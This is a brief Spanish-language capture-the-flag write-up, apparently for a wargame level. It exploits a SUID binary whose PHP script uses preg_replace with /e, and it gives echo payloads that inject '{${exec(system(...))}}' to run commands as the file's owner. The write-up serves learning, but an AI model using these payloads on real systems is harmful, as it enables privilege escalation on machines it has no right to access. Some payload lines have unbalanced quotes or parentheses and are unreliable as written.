Level06 Remote Code Execution (RCE)
Más concretamente:
	PHP Code Injection via preg_replace(/e)
Clasificación:
	CWE-94: Code Injection
	CWE-95: Eval Injection
ls -l
	-rwsr-x---+ 1 flagxx levelxx 7503 Aug 30  2015 levelxx
	-rwxr-x---  1 flagxx levelxx  356 Mar  5  2016 levelxx.php
s en el bit del owner SUID, lo que significa que el binario se ejecutará con los privilegios del owner.
PHP maneja las variables complejas dentro de strings. Si el script encuentra algo como [x {${eval($_GET[c])}}], intentará ejecutarlo.
Proceso : 
Crear archivo para que ejecute el binario que espera un archivo como argumento.
	echo  ‘[x system(‘id’)]’  >  /tmp/hack
	./levelxx  /tmp/hack   salida → system(id)
	 echo '[x {${exec(system('id'))}}]' > /tmp/hack salida → (id user/group)
	 echo '[x {${exec(system('getflag'))}}]' > /tmp/hack
Conclusion : 
El binario suid ejecuta un script PHP que utiliza preg_replace con el modificador /e, lo que provoca ejecución de código PHP arbitrario controlado por el usuario. Esto permite escalar privilegios y ejecutar comandos como el usuario propietario del binario (flagxx).
 echo '[x {${exec(getflag))}}]' > /tmp/hack
